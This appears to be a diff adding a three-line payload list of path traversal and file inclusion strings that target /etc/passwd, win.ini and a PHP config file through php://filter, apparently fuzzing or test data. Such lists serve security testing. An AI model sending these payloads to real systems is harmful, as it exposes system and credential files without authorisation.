@@ -1,0 +1,3 @@
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+php://filter/resource=config.inc.php
